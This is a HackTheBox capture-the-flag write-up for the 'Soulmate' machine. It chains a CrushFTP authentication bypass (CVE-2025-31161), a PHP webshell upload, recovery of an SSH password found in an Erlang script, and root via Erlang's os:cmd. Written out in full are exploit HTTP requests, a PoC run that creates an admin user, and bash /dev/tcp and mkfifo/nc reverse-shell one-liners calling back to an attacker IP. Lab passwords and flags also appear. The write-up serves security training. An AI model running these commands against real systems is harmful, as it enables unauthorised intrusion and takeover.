---
title: Soulmate - HTB
date: 2026-01-25
categories: [WriteUps, HTB]
tags: [HTB, linux, web, privesc]
image:
  base: /assets/img/posts/htb/soulmate
active: false
difficulty: easy
os: linux
description: "Soulmate is a HackTheBox machine (no season)."
pawned: root
---

# Soulmate
IP: `10.129.11.184`

# Scan
- TCP

```bash
sudo nmap -n -sV -sS -Pn -T4 -p- -oN scan.txt 10.129.11.184
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

- UDP

```bash
sudo nmap -sU -p- -T4 --min-rate 1000 10.129.11.184 -oN scan-udp.txt
All 65535 scanned ports on 10.129.11.184 are in ignored states.
Not shown: 65072 open|filtered udp ports (no-response), 463 closed udp ports (port-unreach)
```

- TCP ports advanced

```bash
sudo nmap -n -sV -sC -Pn -p80 -oN scan-advanced.txt 10.129.11.184
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
```

# Foothold
Write in `/etc/hosts`
```bash
echo '10.129.11.184 soulmate.htb' | sudo tee /etc/hosts -a
```

- Analyze subdomains

```bash
ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FHOST -u http://soulmate.htb/ -H 'Host:FHOST.soulmate.htb' -t 100 -fs 154
...
ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 167ms]
```

We can update the `/etc/hosts`
```bash
echo '10.129.11.184 soulmate.htb ftp.soulmate.htb' | sudo tee /etc/hosts -a
```

- Searching pages, we see a post and a response

```bash
POST /WebInterface/function/ HTTP/1.1
Host: ftp.soulmate.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/javascript, text/html, application/xml, text/xml, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://ftp.soulmate.htb/WebInterface/new-ui/reset.html
X-Requested-With: XMLHttpRequest
Content-Type: [object Object]
Content-Length: 165
Origin: http://ftp.soulmate.htb
DNT: 1
Connection: close
Cookie: CrushAuth=1769509924438_1gYkwgZ6rDpcdcfGhcjhVVoyayhZvb
Priority: u=0

command=request_reset&reset_username_email=admin&currentURL=http%3A%2F%2Fftp.soulmate.htb%2FWebInterface%2Fnew-ui%2Freset.html&language=en&random=0.44671294575353004


HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 27 Jan 2026 10:56:44 GMT
Content-Type: text/xml;charset=utf-8
Content-Length: 148
Connection: close
Cache-Control: no-store
Pragma: no-cache
P3P: policyref="/WebInterface/w3c/p3p.xml", CP="IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT"

<?xml version="1.0" encoding="UTF-8"?> 
<commandResult><response>java.lang.Exception%3A%20Unknown%20Host%20for%20Reset</response></commandResult>

```
This is XML response so maybe there is smth to do and also in the POST we see a currentURL, maybe there is an RFI to play here?

Lastly CrushFTP suffers from few exploits, maybe we can get the version?

Some explaination: https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation

Let's try some basic command as shown:
```bash
GET /WebInterface/function/?command=getUserList&serverGroup=MainUser&c2f=1111 HTTP/1.1
Host: ftp.soulmate.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://ftp.soulmate.htb/WebInterface/new-ui/reset.html
DNT: 1
Connection: close
Cookie: CrushAuth=1769509924438_1gYkwgZ6rDpcdcfGhcjhVVoyay1111      # <--- Don't forget the same last 4 digits as c2f
Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/
Upgrade-Insecure-Requests: 1
If-Modified-Since: Wed, 13 Aug 2025 18:46:10 GMT
If-None-Match: 1755110770160
Priority: u=0, i



# RESPONSE
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 27 Jan 2026 11:14:47 GMT
Content-Type: text/xml;charset=utf-8
Content-Length: 305
Connection: close
Cache-Control: no-store
Pragma: no-cache
P3P: policyref="/WebInterface/w3c/p3p.xml", CP="IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT"

<?xml version="1.0" encoding="UTF-8"?> 
<result><response_status>OK</response_status><response_type>properties</response_type><response_data><user_list type="properties">
	<user_list type="vector">
		<user_list_subitem>default</user_list_subitem>
	</user_list>
</user_list></response_data></result>

```

Well we have our exploit! Tooling we can clone: [CVE-2025-31161](https://github.com/f4dee-backup/CVE-2025-31161.git).
During our investigation and file analysis, we saw a requirements for the password: 6 characters long at least.

Running POC:
```bash
./CVE-2025-31161.sh --url http://ftp.soulmate.htb/ --port 80 --target-user crushadmin --new-user admin --new-password pass123

[*] Checking if the server is online... Waiting...

[*] Server is online. Starting preparation phase...
[*] Generating dynamic CrushAuth token...
[i] CrushAuth generated: 7841566687392_ZWz3WicqyMcIsjZb4AdbHvvKBU1240
[*] Sending warm-up request to the server...
[*] Sending user creation payload for 'admin'...

[>] User successfully created: admin
[*] Credentials:
	Username: admin
	Password: pass123
```

Trying to sign-in, and we are in the website.

On the page `http://ftp.soulmate.htb/WebInterface/UserManager/index.html`, we found our users:
```
admin  <--- created fake account
ben
crushadmin
default
jenna
TempAccount
```

Probably `jenna` or `ben` will be targets! From this panel we can change users password, let's do this and then try to connect with the newly set password. It worked, we can now try to upload files because ben could have access to `webProd` which is the folder of the running website. We will upload a webshell.

![Upload Webshell]({{page.image.base}}/upload-webshell.png)

- Setup listener: `rlwrap nc -nlvp 4444 -s 10.10.16.40`
- Run webshell.php at `http://soulmate.htb/webshell.php` and then check listener

```bash
rlwrap nc -nlvp 4444 -s 10.10.16.40
listening on [10.10.16.40] 4444 ...
connect to [10.10.16.40] from (UNKNOWN) [10.129.11.184] 49136
Linux soulmate 5.15.0-153-generic #163-Ubuntu SMP Thu Aug 7 16:37:18 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 11:39:39 up  1:36,  0 users,  load average: 0.00, 0.03, 0.55
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1150): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soulmate:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@soulmate:/$ 
```

>[!success] Foothold DONE as `www-data`

# User
During file, log and process checks, we stubled upon this:
```bash
root        1146  0.0  1.6 2252304 67728 ?       Ssl  10:03   0:05 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
```

![Erlang Script]({{page.image.base}}/erlang-script.png)

>[!success] Ben account

>password: HouseH0ldings998

Testing SSH from outside, gives us access!
```bash
ssh ben@soulmate.htb
ben@soulmate.htb's password: HouseH0ldings998
ben@soulmate:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben)
ben@soulmate:~$ cat user.txt 
a4d0177c81c4004debcf133865cf8b46
```

# Root
Once in, we continue the investigation, and we see this
![Network Listeners]({{page.image.base}}/network-listeners.png)

From this listener: `127.0.0.1:2222` we can recall the SSH from erlang. This erlang process runs as root so if we can get some sort of connection we can probably run root commands. So let's connect:
```bash
ssh -p2222 127.0.0.1
The authenticity of host '[127.0.0.1]:2222 ([127.0.0.1]:2222)' can't be established.

(ssh_runner@soulmate)1> help().
** shell internal commands **
...
m()        -- which modules are loaded
m(Mod)     -- information about module <Mod>
mm()       -- list all modified modules
memory()   -- memory allocation information
memory(T)  -- memory allocation information of type <T>
nc(File)   -- compile and load code in <File> on all nodes
...
true

```

This line can help us identify which modules could be abused: `m()        -- which modules are loaded`

```bash
(ssh_runner@soulmate)2> m().
Module                File
...
os                    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/os.beam
...
```

Here we have the documentation of the OS module: `https://www.erlang.org/doc/apps/kernel/os.html`

Often OS provides a command system and yes here we have it: `os:cmd('')`

```bash
(ssh_runner@soulmate)4> os:cmd('id').
"uid=0(root) gid=0(root) groups=0(root)\n"
```

We setup our listener again: `rlwrap nc -nlvp 4444 -s 10.10.16.40` and then run bash reverse shell:
```bash
(ssh_runner@soulmate)5> os:cmd('bash -i >& /dev/tcp/10.10.16.40/4444 0>&1')
"/bin/sh: 3: Syntax error: Bad fd number\n"
```

No /dev/tcp -> need to do it with `mkfifo`:
```bash
# rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.16.40 4444 > /tmp/f
(ssh_runner@soulmate)10> os:cmd('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.16.40 4444 > /tmp/f').

```

On our listener:
```bash
rlwrap nc -nlvs 10.10.16.40 -p 4444
listening on [10.10.16.40] 4444 ...
connect to [10.10.16.40] from (UNKNOWN) [10.129.11.184] 41054
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
...
```